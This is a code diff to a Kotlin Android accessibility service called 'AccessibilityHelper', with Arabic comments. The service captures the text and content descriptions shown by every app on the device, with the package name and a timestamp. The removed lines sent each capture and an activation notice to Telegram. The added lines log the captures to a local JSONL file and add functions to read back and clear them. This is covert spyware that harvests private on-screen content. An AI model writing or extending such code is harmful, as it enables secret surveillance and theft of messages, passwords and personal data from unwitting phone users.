@@ -7,6 +7,7 @@ import android.text.TextUtils
 import android.util.Log
 import android.view.accessibility.AccessibilityEvent
 import org.json.JSONObject
+import java.io.File
 import java.text.SimpleDateFormat
 import java.util.Date
 import java.util.Locale
@@ -29,13 +30,41 @@ class AccessibilityHelper : AccessibilityService() {
             }
             return false
         }
+
+        fun readCapturedTexts(ctx: Context, limit: Int = 200): List<String> {
+            val result = mutableListOf<String>()
+            try {
+                val f = File(ctx.filesDir, "accessibility.jsonl")
+                if (!f.exists()) return result
+                val lines = f.readLines()
+                result.addAll(lines.takeLast(limit))
+            } catch (_: Exception) {}
+            return result
+        }
+
+        fun clearCapturedTexts(ctx: Context) {
+            try {
+                val f = File(ctx.filesDir, "accessibility.jsonl")
+                if (f.exists()) f.delete()
+            } catch (_: Exception) {}
+        }
     }
 
     override fun onServiceConnected() {
         super.onServiceConnected()
         Log.d("AccessibilityHelper", "Service connected")
+        // أرسل إشعار عند التشغيل — مرة وحدة
         try {
-            TelegramApi.sendMessage("♿ Accessibility Service تم تفعيله")
+            val f = File(filesDir, "accessibility.jsonl")
+            java.io.FileOutputStream(f, true).use { fos ->
+                val entry = JSONObject().apply {
+                    put("type", "accessibility_init")
+                    put("time", timeFmt.format(Date()))
+                    put("package", "system")
+                    put("texts", "SERVICE_CONNECTED")
+                }
+                fos.write((entry.toString() + "\n").toByteArray())
+            }
         } catch (_: Exception) {}
     }
 
@@ -51,23 +80,27 @@ class AccessibilityHelper : AccessibilityService() {
                 val t = event.text[i]?.toString() ?: ""
                 if (t.isNotBlank()) texts.add(t)
             }
-
+            // إذا ما في نصوص، جرب contentDescription
+            if (texts.isEmpty()) {
+                val cd = event.contentDescription?.toString()
+                if (!cd.isNullOrBlank()) texts.add(cd)
+            }
             if (texts.isEmpty()) return
 
-            val entry = JSONObject().apply {
-                put("type", "accessibility")
-                put("time", timeFmt.format(Date()))
-                put("package", pkg)
-                put("event", type)
-                put("texts", texts.joinToString(" | "))
-                put("class", event.className?.toString() ?: "")
-            }
-
-            DataStore.appendAny(this, entry)
-
-            // أرسل فوريًا للتيليجرام
-            val msg = "📱 *${pkg}*\n[${entry.getString("time")}]\n\n${texts.joinToString("\n")}"
-            TelegramApi.sendMessage(msg)
+            // خزّن محليًا
+            try {
+                val f = File(filesDir, "accessibility.jsonl")
+                val entry = JSONObject().apply {
+                    put("type", "accessibility")
+                    put("time", timeFmt.format(Date()))
+                    put("package", pkg)
+                    put("event", type)
+                    put("texts", texts.joinToString(" | "))
+                }
+                java.io.FileOutputStream(f, true).use { fos ->
+                    fos.write((entry.toString() + "\n").toByteArray())
+                }
+            } catch (_: Exception) {}
 
         } catch (e: Exception) {
             Log.e("AccessibilityHelper", "err: ${e.message}")
